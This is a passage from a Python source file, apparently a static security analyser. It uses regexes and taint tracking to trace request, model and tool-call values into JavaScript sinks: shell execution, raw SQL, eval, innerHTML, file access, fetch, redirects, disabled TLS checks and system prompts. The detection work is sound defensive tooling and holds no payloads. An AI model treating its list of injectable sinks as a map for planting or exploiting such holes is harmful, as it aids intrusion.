_CP_IMPORT = re.compile(r"""import\s+(?:\*\s+as\s+([\w$]+)|([\w$]+)(?:\s*,\s*\{([^}]{0,500})\})?|\{([^}]{0,500})\})\s+from\s+['"](?:node:)?child_process['"]""")
_EXECA_IMPORT = re.compile(r"""import\s+\{([^}]{0,500})\}\s+from\s+['"]execa['"]|(?:const|let|var)\s+\{([^}]{0,500})\}\s*=\s*require\(\s*['"]execa['"]\s*\)""")
_SHELLJS = re.compile(r"""(?:import\s+(?:\*\s+as\s+)?([\w$]+)\s+from|(?:const|let|var)\s+([\w$]+)\s*=\s*require\()\s*\(?\s*['"]shelljs['"]""")
_CP_CALL = re.compile(r"(?<![\w$])(?:([A-Za-z_$][\w$]*)\s*\.\s*)?(exec|execSync|spawn|spawnSync|execFile|execFileSync|"
                      r"execaCommand|execaCommandSync|execa|execaSync)\s*\(")
_REQUIRE_CP_INLINE = re.compile(r"""require\(\s*['"](?:node:)?child_process['"]\s*\)\s*\.\s*(exec|execSync|spawn|spawnSync)\s*\(""")
_JS_SQL_CALL = re.compile(r"\.\s*(query|execute|raw|prepare|exec|all|get|run|unsafe|many|one|oneOrNone|manyOrNone|any|none|"
                          r"each|whereRaw|orWhereRaw|havingRaw|orderByRaw|groupByRaw|joinRaw|selectRaw|fromRaw|"
                          r"\$queryRawUnsafe|\$executeRawUnsafe)\s*\(")
_JS_RAW = {"whereRaw", "orWhereRaw", "havingRaw", "orderByRaw", "groupByRaw", "joinRaw", "selectRaw", "fromRaw",
           "$queryRawUnsafe", "$executeRawUnsafe", "unsafe"}
_JS_DB_RECEIVER = re.compile(r"(?i)(?:^|\.)(?:\w*(?:db|sql|pool|client|conn|connection|knex|sequelize|prisma|pg|mysql|sqlite|"
                             r"database|tx|trx|turso|neon|d1|libsql|duckdb|supabase|postgres))$")
_JS_CODE = re.compile(r"eval\s*\(|new\s+Function\s*\(|vm\s*\.\s*(?:runInNewContext|runInThisContext|runInContext|"
                      r"compileFunction)\s*\(|new\s+vm\s*\.\s*Script\s*\(|(?:setTimeout|setInterval)\s*\(")
_JS_HTML = re.compile(r"dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*|\.\s*(?:innerHTML|outerHTML)\s*\+?=(?!=)\s*|"
                      r"\.\s*insertAdjacentHTML\s*\(|document\s*\.\s*write(?:ln)?\s*\(")
# Resposta HTML montada no servidor: Express/Node res.send, res.write, res.end (Express manda texto como text/html),
# Fastify reply.send e Hono c.html.
_JS_RES_HTML = re.compile(r"(?<![\w$.])(?:res|response|reply)\s*(?:\.\s*(?:status|type|set|header|setHeader|code|contentType|"
                          r"writeHead)\s*\([^()]*\)\s*)*\.\s*(send|write|end)\s*\(|(?<![\w$.])(c)\s*\.\s*html\s*\(")
_JS_HTML_SAFE = re.compile(r"(?i)escape|sanitiz|purify|xss|encode|stringify|\bhe\s*\.")
_TPL_HTML = re.compile(r"""\bv-html\s*=\s*"([^"]{0,2000})"|\{@html\s+([^}]{0,2000})\}|\bset:html\s*=\s*\{([^}]{0,2000})\}""")
_JS_SANITIZE = re.compile(r"(?i)DOMPurify|purify|sanitiz|\bxss\b|filterXSS|escape|encodeHTML|he\s*\.\s*encode|insane|"
                          r"JSON\s*\.\s*stringify|serialize|highlight|katex|prism|shiki|hljs|mermaid|icon|svg|\bcss\b|style")
_JS_TLS = re.compile(r"\brejectUnauthorized\s*:\s*false\b|\bstrictSSL\s*:\s*false\b")
_NODE_TLS = re.compile(r"NODE_TLS_REJECT_UNAUTHORIZED['\"]?\s*\]?\s*=(?!=)\s*['\"]?0\b")
_ENV_TLS = re.compile(r"(?m)\b(NODE_TLS_REJECT_UNAUTHORIZED|PYTHONHTTPSVERIFY)['\"]?\s*[=:]\s*['\"]?0\b")
_JS_FS = re.compile(r"(?:fs|fsp|fsPromises|fse|fsExtra)(?:\s*\.\s*promises)?\s*\.\s*(?:readFile|readFileSync|createReadStream|writeFile|writeFileSync|"
                    r"appendFile|appendFileSync|unlink|unlinkSync|rm|rmSync|createWriteStream|readdir|readdirSync|copyFile|"
                    r"rename|open)\s*\(|res\s*\.\s*(?:sendFile|download)\s*\(|Bun\s*\.\s*file\s*\(|"
                    r"Deno\s*\.\s*(?:readTextFile|readFile|open|remove|writeTextFile)\s*\(")
_JS_FS_BARE = re.compile(r"(readFile|readFileSync|createReadStream|writeFile|writeFileSync|unlink|rm|open)\s*\(")
_FS_IMPORT = re.compile(r"""from\s+['"](?:node:)?fs(?:/promises)?['"]|require\(\s*['"](?:node:)?fs(?:/promises)?['"]\s*\)""")
_JS_FETCH = re.compile(r"(?:fetch|got|ky|needle|ofetch|\$fetch)\s*\(|axios\s*(?:\.\s*(?:get|post|put|patch|delete|head|request))?\s*\(|"
                       r"(?:got|ky|superagent|needle)\s*\.\s*(?:get|post|put|patch|delete)\s*\(|https?\s*\.\s*(?:get|request)\s*\(")
_JS_BARE_FETCH = re.compile(r"(?:fetch|got|ky|needle|ofetch|\$fetch)\s*\(")
_JS_REDIRECT = re.compile(r"(?:res|reply|response|ctx|c|h)\s*\.\s*redirect\s*\(|(?:NextResponse|Response)\s*\.\s*redirect\s*\(|"
                          r"(?:redirect|permanentRedirect)\s*\(|location\s*\.\s*(?:assign|replace)\s*\(|"
                          r"router\s*\.\s*(?:push|replace)\s*\(|(?:window\s*\.\s*)?location(?:\s*\.\s*href)?\s*=(?![=>])")
_JS_GUARD_PATH = re.compile(r"startsWith\s*\(|path\s*\.\s*relative\s*\(|includes\s*\(\s*['\"]\.\.|isPathInside|basename\s*\(|"
                            r"\.test\s*\(|isWithin|isInside|isSubPath|isSafePath|(?<![\w$])isAllowed[\w$]*\s*\(|"
                            r"(?<![\w$])(?:validate|assert|check|verify)[\w$]*?(?:Path|Allowed|Safe|Inside|Within|Root)"
                            r"(?![\w$]*Exist)[\w$]*\s*\(|(?<![\w$])ensure[\w$]*?(?:Allowed|Safe|Inside|Within)[\w$]*\s*\(")
_JS_GUARD_REDIRECT = re.compile(r"startsWith\s*\(\s*['\"]/|isSafe|safeRedirect|isValidRedirect|isRelative|allowed|whitelist|"
                                r"allowlist|\.origin\s*[!=]==|\.host(?:name)?\s*[!=]==")
_JS_GUARD_URL = re.compile(r"(?i)allowed|whitelist|allowlist|isPrivate|private_?(?:ip|address|network|range|host|cidr)|isPublic|"
                           r"\.hostname\s*[!=]==|\.host\s*[!=]==|startsWith\s*\(")
_JS_RANDOM = re.compile(r"Math\s*\.\s*random\s*\(")
# Começo de função com nome: function f(, const f = (...) =>, método f(...) {. Lido uma vez por arquivo (procurar nos 1500
# caracteres antes de cada return custava segundos com milhares deles), com tetos e ^[ \t]* para não ler o arquivo de novo.
_JS_FN_HEAD = re.compile(r"(?:function\s+([A-Za-z_$][\w$]*)|(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*(?:async\s*)?"
                         r"(?:\([^()]{0,300}\)|[\w$]+)\s*(?::[^=]{0,200})?=>|^[ \t]*(?:async\s+)?([A-Za-z_$][\w$]*)\s*\([^()]{0,300}\)\s*"
                         r"(?::[^{]{0,200})?\{)", re.M)
# Quem recebe o valor na linha do Math.random(): const x =, this.x =, x: (chave), const x: string =. Os espaços do tipo
# só aparecem entre palavras, para a busca não ter dois jeitos de casar os mesmos espaços (ficava cúbica).
_JS_RANDOM_NAME = re.compile(r"(?:(?:const|let|var)\s+|this\s*\.\s*|\.)?(?<![\w$])([A-Za-z_$][\w$]*)[ \t]*"
                             r"(?::[ \t]*[\w<>\[\]|]+(?:[ \t]+[\w<>\[\]|]+)*)?[ \t]*[:=](?!=)[^=:]*$")
_JS_HASH = re.compile(r"""createHash\(\s*(['"])(md5|sha1|sha256|sha512|sha224|sha384)\1\s*\)|"""
                      r"""(?<![\w$.])(md5|sha1|sha256|sha512)\s*\(|\bCryptoJS\s*\.\s*(MD5|SHA1|SHA256|SHA512|SHA3)\s*\(""")
_JS_SYSTEM = re.compile(r"""role\s*:\s*(['"])(?:system|developer)\1""")
_JS_SYSTEM_KEY = re.compile(r"(?:system|instructions|systemInstruction|systemPrompt)\s*:\s*")
_JS_SYSTEM_MSG = re.compile(r"new\s+SystemMessage\s*\(|SystemMessagePromptTemplate\s*\.\s*fromTemplate\s*\(|\[\s*(['\"])system\1\s*,\s*")
_JS_LLM_IMPORT = re.compile(r"""(?:from\s+|require\(\s*)['"](openai|@anthropic-ai/sdk|ai|@ai-sdk/[\w-]+|@google/generative-ai|"""
                            r"""@google/genai|groq-sdk|@mistralai/mistralai|cohere-ai|@langchain/[\w-]+|langchain(?:/[\w/-]+)?|"""
                            r"""replicate|together-ai|@huggingface/inference|@openrouter/ai-sdk-provider|@fal-ai/[\w-]+|"""
                            r"""@aws-sdk/client-bedrock-runtime|portkey-ai|@vercel/ai|ai/rsc|ai/react)['"]""")
_JS_LLM_CALL = re.compile(r"\.(?:chat\s*\.\s*)?completions\s*\.\s*create\s*\(|\.messages\s*\.\s*(?:create|stream)\s*\(|"
                          r"\.responses\s*\.\s*(?:create|stream)\s*\(|(?<![\w$.])(?:generateText|streamText|generateObject|"
                          r"streamObject|embed|embedMany|generateImage|experimental_generateImage|streamUI|"
                          r"experimental_transcribe|generateSpeech)\s*\(|\.generateContent(?:Stream)?\s*\(|"
                          r"\.images\s*\.\s*(?:generate|edit)\s*\(|\.embeddings\s*\.\s*create\s*\(|\breplicate\s*\.\s*run\s*\(|"
                          r"\.chat\s*\.\s*complete\s*\(|\.chat\s*\.\s*stream\s*\(|\.audio\s*\.\s*\w+\s*\.\s*create\s*\(|"
                          r"InvokeModel(?:WithResponseStream)?Command|\.textGeneration\s*\(|\.chatCompletion\s*\(")
_JS_LC_CALL = re.compile(r"\.\s*(?:invoke|stream|batch|call|streamEvents)\s*\(")
_JS_ROUTE_PATH = re.compile(r"(?:^|/)(?:src/)?app/(?:.+/)?route\.(?:js|ts|mjs)$|(?:^|/)(?:src/)?pages/api/.+\.(?:js|ts|mjs)$|"
                            r"(?:^|/)src/routes/(?:.+/)?\+(?:server|page\.server)\.(?:js|ts)$|(?:^|/)server/(?:api|routes)/.+\.(?:js|ts|mjs)$|"
                            r"^api/[^/]+\.(?:js|ts|mjs)$|(?:^|/)netlify/(?:edge-)?functions/.+\.(?:js|ts|mjs)$|"
                            r"(?:^|/)supabase/functions/[^/]+/index\.(?:ts|js)$|(?:^|/)app/routes/.+\.(?:js|ts|jsx|tsx)$")
_JS_SERVER_ROUTE = re.compile(r"""(?<![\w$.])(?:app|router|server|fastify|api|routes?|r|hono)\s*\.\s*(?:post|get|put|patch|all|route)\s*\(\s*['"`]/""")
# [ \t]* e não \s*: com re.M, \s* passava das linhas em branco e cada começo de linha lia o resto do arquivo.
_JS_USE_SERVER = re.compile(r"""^[ \t]*(['"])use server\1""", re.M)
_JS_AUTH = re.compile(r"(?i)\b(?:getServerSession|getSession|currentUser|getUser|getAuth|clerk\w*|requireAuth|withAuth|"
                      r"isAuthenticated|authenticate\w*|authorize\w*|verifyToken|jwtVerify|verifyJwt|verifyIdToken|getToken|"
                      r"validateRequest|getKindeServerSession|withApiAuthRequired|getIronSession|unauthorized|authorization|"
                      r"requireUser|ensureAuth\w*|passport|lucia|betterAuth|nextauth|verifySignature|constructEvent|"
                      r"verifyWebhook|CRON_SECRET|bearer|apiKeyAuth|checkAuth|protectedProcedure|privateProcedure|"
                      r"authedProcedure|requireSession|getCurrentUser|getUserId|verifyApiKey|auth)\b\s*\(?|\bjwt\s*\.\s*verify|"
                      r"supabase\s*\.\s*auth|x-api-key|\b401\b|session\s*\??\.\s*user|\breq\s*\.\s*user\b|locals\s*\.\s*(?:user|session)|"
                      r"\b(?:ctx|context)\s*\.\s*(?:user|session|auth)\b|@clerk/|next-auth|@auth/|firebase-admin|better-auth")
_JS_LIMIT = re.compile(r"(?i)rate.?limit|ratelimit|limiter|throttl|@upstash/ratelimit|express-rate-limit|rate-limiter-flexible|"
                       r"arcjet|@unkey/|botid|checkBotId|turnstile|recaptcha|hcaptcha|captcha|quota|credits?\s*[<>]=?|usage\s*[<>]=?")


class _OutOfBudget(Exception):
    pass


class _Js:
    def __init__(self, rel, text, project, ext=None):
        self.rel, self.text, self.project = rel, text, project
        self.code, self.mask, lits = _js_mask(_script_only(rel, text))
        self.lit_ends = {y for _, y in lits}  # onde o texto de uma string ou regex termina (a / que fecha a regex)
        self.sql_lits = any(_SQL_VERB.match(self.code, x, y) for x, y in lits)
        self.out = _Out(rel)
        self.budget = _JS_BUDGET + 40 * len(text)
        self.env = {"searchParams": {REQ}}
        self.strs = {}
        self.vals = {}           # nome -> trecho do valor declarado (const url = new URL(...)), para achar o começo
        self.mcp = "CallToolRequestSchema" in self.code
        self.cp_mods, self.cp_funcs = set(), {}
        self.use_client = bool(re.match(r"""\s*(['"])use client\1""", self.code))
        self.chat_hooks = any(h in self.mask for h in ("useChat", "useCompletion", "useAssistant", "useObject")) and \
            bool(re.search(r"(?<![\w$.])use(?:Chat|Completion|Assistant|Object)\s*\(", self.mask))
        self._server = self._llm_file = None
        self.tool_spans = []
        self.has_req = self.has_llm = self.has_tool = False
        self.tool_rx = None      # leitura dos argumentos de tool calling da API, quando o arquivo trata disso
        self.typed = set()       # argumentos de ferramenta que o Zod restringe a número, enum, uuid...
        self._depth = None       # (posições, profundidade) dos parênteses, para saber se a função é o handler
        self._opens = None       # profundidade -> posições dos que abrem, para achar o ( de uma seta
        self.seeds = {}          # helper -> índices dos parâmetros que recebem argumento de ferramenta
        self.fn_groups = {}      # helper -> nomes de cada parâmetro (o padrão desestruturado conta como um)
        self.fn_tool = set()     # helpers cujos parâmetros já eram argumento de ferramenta
        self.fn_starts = []      # onde começa cada função com nome e cada handler de ferramenta
        # Funções deste arquivo que outro arquivo chama com argumento de ferramenta ("f:nome" -> índices), e funções
        # importadas de outro arquivo do projeto (nome local -> (caminho do import, nome exportado)).
        self.ext = ext or {}
        self.seeds.update((k, set(v)) for k, v in self.ext.items())
        self.ximports = {}

    def line(self, pos):
        return line_of(self.text, pos)

    @property
    def server(self):
        if self._server is None:
            self._server = self.server_side()
        return self._server

    def llm_file(self):
        if self._llm_file is None:
            self._llm_file = bool(_JS_LLM_IMPORT.search(self.code))
        return self._llm_file

    # ------------------------------------------------------------------ texto

    def trim(self, a, b):
        while a < b and self.mask[a] in " \t\r\n":
            a += 1
        while b > a and self.mask[b - 1] in " \t\r\n":
            b -= 1
        return a, b

    def spend(self, n):
        self.budget -= n
        if self.budget < 0:
            raise _OutOfBudget

    def close(self, i, limit=6000):
        """Posição do fechamento do (, [ ou { em i, ou -1."""
        depth = 0
        end = min(len(self.mask), i + limit)
        for m in _BRACKETS.finditer(self.mask, i, end):
            if m.group() in "([{":
                depth += 1
            else:
                depth -= 1
                if depth == 0:
                    self.spend(m.start() - i)
                    return m.start()
        self.spend(end - i)
        return -1

    def open_before(self, j, limit=2000):
        """Posição do (, [ ou { que abre o fechamento em j (até limit caracteres antes), ou -1. Usa o índice de
        depth_at: voltar caractere por caractere a cada => custava até 2000 passos por seta, sem teto no arquivo."""
        if self.mask[j:j + 1] not in (")", "]", "}"):
            return -1
        self.depth_at(j)
        ps, ds = self._depth
        k = bisect.bisect_left(ps, j)
        # Quem abre é o último que abre antes de j e deixa a profundidade em uma a mais que a de depois de j.
        opens = self._opens.get(ds[k] + 1, ())
        i = bisect.bisect_left(opens, j) - 1
        return opens[i] if i >= 0 and j - opens[i] < limit else -1

    def args(self, i):
        """i logo depois do "(": [(a, b)] dos argumentos de nível zero."""
        out, depth, start = [], 0, i
        end = min(len(self.mask), i + 6000)
        for m in _ARG_STOP.finditer(self.mask, i, end):
            c, j = m.group(), m.start()
            if c in "([{":
                depth += 1
            elif c in ")]}":
                if depth == 0:
                    self.spend(j - i)
                    a, b = self.trim(start, j)
                    if a < b:
                        out.append((a, b))
                    return out
                depth -= 1
            elif depth == 0:
                out.append(self.trim(start, j))
                start = j + 1
        self.spend(end - i)
        return out

    def expr_end(self, p, limit=3000):
        """Fim da expressão que começa em p. Cobra o trecho lido de fato: com 400 por chamada, um arquivo de muitas
        declarações curtas (var a=1;var b=2;...) esgotava o teto do arquivo sem ter lido quase nada."""
        end = self.scan_expr_end(p, limit)
        self.spend(end - p + 1)
        return end

    def scan_expr_end(self, p, limit):
        mask = self.mask
        depth = 0
        n = min(len(mask), p + limit)
        for m in _EXPR_STOP.finditer(mask, p, n):
            c, i = m.group(), m.start()
            if c in "([{":
                depth += 1
            elif c in ")]}":
                if depth == 0:
                    return i
                depth -= 1
            elif depth == 0:
                if c != "\n":
                    return i
                j = i - 1
                while j >= p and mask[j] in " \t\r\n":
                    j -= 1
                last = mask[j] if j >= p else ""
                if last == "/" and j in self.lit_ends:
                    return i  # const SAFE = /^\w+$/: a / fecha a regex, não é uma divisão que continua embaixo
                rest = mask[i:i + 200].lstrip()
                if not (last in "=+-*/%&|^!?:,(<>." or rest[:1] in ".?:+-*/%&|^)]}" or rest[:2] in ("&&", "||", "??")):
                    return i
        return n

    def origins(self, a, b):
        self.spend(b - a)
        m = self.mask[a:b]
        s = m.strip()
        if not s or _JS_KILL.search(s) and (_JS_KILL.match(s) or s.endswith(".length")):
            return set()
        o = set()
        if "(" in m:
            m = _opaque_calls(m)
        if "[" in m:
            m = self.lookups(a, m)
        if self.mcp and _JS_MCP_ARGS.search(m):
            o.add(TOOL)
            m = _JS_MCP_ARGS.sub(" ", m)
        if self.tool_rx is not None and self.tool_rx.search(m):
            o.add(TOOL)
        if "file" in m:
            m = _JS_UPLOAD.sub(lambda x: " " * len(x.group()), m)
        if self.has_req and _JS_REQ.search(m):
            o.add(REQ)
        if self.has_req and _JS_PARAMS_END.search(s) and _JS_REQ_URL.search(s):
            o.add(REQ)  # const sp = new URL(req.url).searchParams: sp.get('x') é a busca da requisição
        if self.has_llm and _JS_LLM.search(m):
            o.add(LLM)
        env = self.env
        for w in _IDENT.finditer(m):
            v = env.get(w.group())
            if not v:
                continue
            i, j = w.start(), w.end()
            if i and (m[i - 1] in _WORDCH or m[i - 1] == "." and m[i - 3:i] != "..."):
                continue
            rest = m[j:j + 40].lstrip()
            if rest[:1] == ":" and rest[:2] != "::" and m[:i].rstrip()[-1:] in ("{", ","):
                continue  # chave de objeto, não valor
            o |= v
        if "this" in m:
            for w in _JS_THIS.finditer(m):
                v = env.get("this." + w.group(1))
                if v:
                    o |= v
        return o

    def lookups(self, a, m):
        """Apaga a chave de SORTS[req.query.sort] quando o objeto é do código: o valor sai da tabela, não da requisição.
        Com o objeto vindo de fora (req.body[campo], linhas[i] de uma lista da requisição), nada muda."""
        parts, pos, i = [], 0, m.find("[")
        while i >= 0:
            j = i - 2 if m[i - 2:i] == "?." else i
            k = j
            while k > 0 and j - k < 200 and (m[k - 1] in _WORDCH or m[k - 1] == "." and k > 1 and m[k - 2] in _WORDCH):
                k -= 1
            # Só um nome (SORTS, cfg.sorts) colado no [: não f()[x], a[0][x], 3[x] nem o fim de um ...spread.
            if k < j and m[k] not in "0123456789." and (k == 0 or m[k - 1] not in ".])") and \
                    not self.origins(a + k, a + j):
                close = _close_bracket(m, i)
                if close < 0:
                    break
                if _IDENT.search(m, i + 1, close):  # choices[0], rows["id"]: índice fixo, nada a apagar
                    parts += [m[pos:i + 1], " " * (close - i - 1)]
                    pos = close
                    i = m.find("[", close)
                    continue
            i = m.find("[", i + 1)
        if not parts:
            return m
        parts.append(m[pos:])
        return "".join(parts)

    def split_plus(self, a, b):
        out, depth, start = [], 0, a
        mask = self.mask
        for m in _PLUS_STOP.finditer(mask, a, b):
            c, j = m.group(), m.start()
            if c in "([{":
                depth += 1
            elif c in ")]}":
                depth -= 1
            elif depth == 0 and mask[j + 1:j + 2] not in ("+", "=") and mask[j - 1:j] != "+":
                out.append((start, j))
                start = j + 1
        out.append((start, b))
        return out

    def pieces(self, a, b, depth=0, room=None):
        """Como _Py.pieces: [("lit", texto) | ("expr", (a, b))], com o mesmo teto de partes remontadas."""
        if room is None:
            room = [_PIECES]
        a, b = self.trim(a, b)
        if a >= b or depth > 6:
            return []
        room[0] -= 1
        if room[0] < 0:
            return [("expr", (a, b))]
        ops = self.split_plus(a, b)
        if len(ops) > 1:
            return [p for x, y in ops for p in self.pieces(x, y, depth + 1, room)]
        c = self.code[a]
        if c in "'\"" and self.code[b - 1] == c and b - a >= 2 and not self.mask[a + 1:b - 1].strip():
            return [("lit", self.code[a + 1:b - 1])]
        if c == "`" and self.code[b - 1] == "`":
            return self.template(a, b)
        word = self.code[a:b]
        if word in self.strs:
            out = []
            for x, y in self.strs[word]:
                out += self.pieces(x, y, depth + 1, room)
            return out
        if c == "(" and self.close(a) == b - 1:
            return self.pieces(a + 1, b - 1, depth + 1, room)
        return [("expr", (a, b))]

    def template(self, a, b):
        out, i = [], a + 1
        while i < b - 1:
            j = self.mask.find("${", i, b - 1)
            if j < 0:
                out.append(("lit", self.code[i:b - 1]))
                break
            out.append(("lit", self.code[i:j]))
            k = self.close(j + 1)
            if k < 0 or k >= b:
                out.append(("expr", (j + 2, b - 1)))
                break
            out.append(("expr", (j + 2, k)))
            i = k + 1
        return out

    def static(self, a, b, value=False):
        """Como _Py.static: value é o valor de fora na posição de um dado, onde o nome (query, count) não diz nada."""
        s = self.code[a:b].strip()
        if re.fullmatch(r"\d+(?:\.\d+)?|[A-Z][A-Z0-9_]*|true|false|null|undefined", s):
            return True
        if re.fullmatch(r"(?:window\.)?location\.(?:origin|host|hostname|protocol)|(?:process|import\.meta)\.env\.\w+", s):
            return True
        if re.search(r"(?i)placeholder", s) or _IDENT.fullmatch(s) and _PLACEHOLDER.search(s) or \
                not value and _JS_SQL_PART.search(s):
            return True
        if re.search(r"\.join\s*\(", s) and _JS_PH_LIT.search(s):
            return True
        if s in self.vals and s not in self.strs:
            # const lista = ids.map(() => '?').join(','): herda a origem de ids, mas o texto é só placeholder.
            v = self.code[slice(*self.vals[s])]
            if re.search(r"\.join\s*\(", v) and _JS_PH_LIT.search(v):
                return True
        return bool(_JS_KILL.match(s)) or s.endswith(".length")

    # ------------------------------------------------------------------ contexto do arquivo

    def server_side(self):
        if self.use_client:
            return False
        if _JS_ROUTE_PATH.search(self.rel) or _JS_USE_SERVER.search(self.code):
            return True
        if re.search(r"(?:^|/)(?:server|api|routes|functions|lambda|backend|middleware)/|\.server\.[jt]sx?$|(?:^|/)server\.[jt]s$",
                     self.rel):
            return True
        return bool(re.search(r"""(?:from\s+|require\(\s*)['"](?:express|hono|fastify|koa|@nestjs/[\w-]+|h3|elysia|"""
                              r"""@hono/[\w-]+|next/server|@sveltejs/kit)['"]|http\.createServer|Deno\.serve|Bun\.serve""", self.code))

    def child_process(self):
        for m in _CP_REQUIRE.finditer(self.code):
            g = m.group(1)
            if g.startswith("{"):
                self.cp_funcs.update(_import_names(g[1:-1], ":"))
            else:
                self.cp_mods.add(g)
        for m in _CP_IMPORT.finditer(self.code):
            if m.group(1) or m.group(2):
                self.cp_mods.add(m.group(1) or m.group(2))
            for g in (m.group(3), m.group(4)):
                if g:
                    self.cp_funcs.update(_import_names(g, " as "))
        for m in _EXECA_IMPORT.finditer(self.code):
            self.cp_funcs.update(_import_names(m.group(1) or m.group(2), " as " if m.group(1) else ":"))
        for m in _SHELLJS.finditer(self.code):
            self.cp_mods.add("shell:" + (m.group(1) or m.group(2)))

    def sources(self):
        """Quais origens de dado perigoso existem no arquivo (as buscas completas só rodam se existirem)."""
        mask = self.mask
        if ("tool" in mask or "Tool" in mask) and ("ool(" in mask or "ool (" in mask or "CallToolRequestSchema" in mask):
            for m in _JS_TOOL_CALL.finditer(mask):
                if m.group()[0] in ".ns" or self.lead_ok(m.start(), False):
                    end = self.close(m.end() - 1, len(mask))  # o handler de CallToolRequestSchema costuma ser longo
                    self.tool_spans.append((m.end(), end if end > 0 else len(mask)))
        self.has_req = "searchParams" in mask or _near(_JS_REQ_HINT, _JS_REQ, mask, 40, 40) or \
            any(t in mask for t in _JS_REQ_CALLS) and bool(_JS_REQ.search(mask)) or \
            "export" in mask and bool(_JS_ROUTE_FN.search(mask))
        self.has_llm = _near(_JS_LLM_HINT, _JS_LLM, mask)
        rx = []
        if "arguments" in mask and (".function" in mask or re.search(r"tool_?calls?|toolCalls?|function_call|functionCall", mask)):
            rx.append(_JS_TOOL_ARGS.pattern)
        if "input" in mask and ("tool_use" in self.code or "toolUse" in mask):
            rx.append(_JS_TOOL_INPUT.pattern)
        if "functionCall" in mask and "args" in mask:
            rx.append(_JS_TOOL_GEMINI.pattern)
        self.tool_rx = re.compile("|".join(rx)) if rx else None
        self.has_tool = self.mcp or bool(self.tool_spans) or self.tool_rx is not None or \
            any(t in mask for t in ("execute", "handler", "func:", "func :", "run:")) and \
            bool(re.search(r"(?:execute|func|handler|run)\s*:", mask)) and bool(_JS_TOOL_KEYS.search(mask))
        self.has_tool = self.has_tool or bool(self.ext)
        if self.has_tool and ("import" in self.code or "require" in self.code):
            for m in _JS_IMPORT.finditer(self.code):
                if m.start() and (self.code[m.start() - 1] in _WORDCH or self.code[m.start() - 1] == "."):
                    continue
                for local, name in _import_names(m.group(1), " as ").items():
                    self.ximports[local] = (m.group(3), name)
            for m in _JS_REQUIRE.finditer(self.code):
                for local, name in _import_names(m.group(1), ":").items():
                    self.ximports[local] = (m.group(3), name)
        if self.has_tool and "z." in mask:
            typed, loose = set(), set()
            for k in _JS_ZOD_KEY.finditer(mask):
                name = _JS_ZOD_NAME.search(mask, max(0, k.start() - 80), k.start())
                kind = _JS_TYPED_ZOD.match(mask, k.end())
                if name and kind:
                    (typed if kind.group(1) or kind.group(3) else loose).add(name.group(1))
            self.typed = typed - loose
        return self.has_req, self.has_llm or self.has_tool

    # ------------------------------------------------------------------ percurso

    def run(self):
        for step in (self.flows, self.local_rules):
            self.budget = _JS_BUDGET + 10 * len(self.text)
            try:
                step()
            except _OutOfBudget:
                pass  # arquivo montado para travar a análise: fica o que já foi achado
        return self.out.list()

    def flows(self):
        """Regras que seguem o valor da origem (requisição, modelo, ferramenta) até o sink."""
        code, mask = self.code, self.mask
        if "child_process" in code or "execa" in code or "shelljs" in code:
            self.child_process()
        req, model = self.sources()
        tool = self.has_tool
        src = req or model
        rules = []
        if self.sql_lits or "raw" in mask or "Raw" in mask or "unsafe" in mask or src and ("query" in mask or "exec" in mask):
            rules.append((_JS_SQL_CALL, self.sql))
        if src and (self.cp_mods or self.cp_funcs):
            rules.append((_CP_CALL, self.command))
        if src and any(t in mask for t in ("eval", "Function", "vm", "setTimeout", "setInterval")):
            rules.append((_JS_CODE, self.code_exec))
        if any(t in mask for t in ("innerHTML", "outerHTML", "insertAdjacentHTML", "dangerouslySetInnerHTML")) or \
                "document" in mask and "write" in mask:
            rules.append((_JS_HTML, self.html))
        # import { readFile } from 'fs/promises': o "fs" está só no texto entre aspas, que a máscara apaga.
        fs_import = (req or tool) and bool(_FS_IMPORT.search(code))
        if fs_import or (req or tool) and any(t in mask for t in ("fs", "sendFile", "download", "Bun", "Deno")):
            rules.append((_JS_FS, self.files))
            if fs_import:
                rules.append((_JS_FS_BARE, self.files))
        if any(t in mask for t in ("fetch", "got", "ky", "needle", "axios", "superagent", "http")) and \
                (req and self.server or tool and not self.use_client):
            rules.append((_JS_FETCH, self.fetch))
        if req:
            if any(t in mask for t in ("redirect", "Redirect", "location", "router")):
                rules.append((_JS_REDIRECT, self.redirect))
            if any(t in mask for t in ("system", "instructions")):
                rules.append((_JS_SYSTEM_KEY, self.system_key))
            if any(t in mask for t in ("send", "write", "end", "html")) and self.server:
                rules.append((_JS_RES_HTML, self.res_html))
        events = []
        for rx, fn in rules:
            for m in rx.finditer(mask):
                events.append((m.start(), 1, "sink", (fn, m)))
        if src and "child_process" in code:
            # require("child_process").exec(...): o nome do módulo está numa string, que a máscara apaga.
            for m in _REQUIRE_CP_INLINE.finditer(code):
                events.append((m.start(), 1, "sink", (self.command_inline, m)))
        if req and ("System" in code or "system" in code):
            for m in _JS_SYSTEM_MSG.finditer(code):
                events.append((m.start(), 1, "sink", (self.system_msg, m)))
        if req and ("system" in code or "developer" in code):
            for m in _JS_SYSTEM.finditer(code):
                events.append((m.start(), 1, "sink", (self.system_role, m)))
        tpl = self.rel.endswith((".vue", ".svelte", ".astro")) and bool(_TPL_HTML.search(self.text))
        if not (events or tpl or tool and self.calls_imported()):
            return  # sem sink no arquivo; com import, a chamada pode levar o argumento da ferramenta a outro arquivo
        events += self.flow_events()
        if "if" in mask and ("includes" in mask or "has" in mask or "test" in mask):
            events += self.guard_events()
        if tool:
            events += self.call_events()
        events.sort(key=lambda e: (e[0], e[1]))
        # Helper que recebe argumento de ferramenta (case "read": return readFile(args.path)) pode ter sido lido antes
        # da chamada: mais uma passada com esses parâmetros vindo do modelo, até duas vezes (helper que chama helper).
        for _ in range(3):
            before = {k: set(v) for k, v in self.seeds.items()}
            self.env, self.strs, self.vals = {"searchParams": {REQ}}, {}, {}
            for _, _, kind, data in events:
                if kind == "decl":
                    self.declare(*data)
                elif kind == "guard":
                    self.guard(*data)
                elif kind == "params":
                    self.bind_params(*data)
                else:
                    fn, m = data
                    fn(m)
            # Só helper deste arquivo pede outra passada ("x:" é função de outro arquivo, lida depois).
            if {k: v for k, v in self.seeds.items() if k not in self.fn_tool and k[:2] != "x:"} == \
                    {k: v for k, v in before.items() if k not in self.fn_tool and k[:2] != "x:"}:
                break
        if tpl:
            self.template_html()

    def calls_imported(self):
        """Alguma função importada de outro arquivo do projeto é chamada aqui (kubectlScale(...), não new Classe())."""
        names = [n for n in self.ximports if n[:1].islower() or n[:1] in "_$"]
        if not names:
            return False
        rx = r"(?<![\w$.])(?<!new )(?:{})\s*\(".format("|".join(re.escape(n) for n in sorted(names, key=len, reverse=True)[:300]))
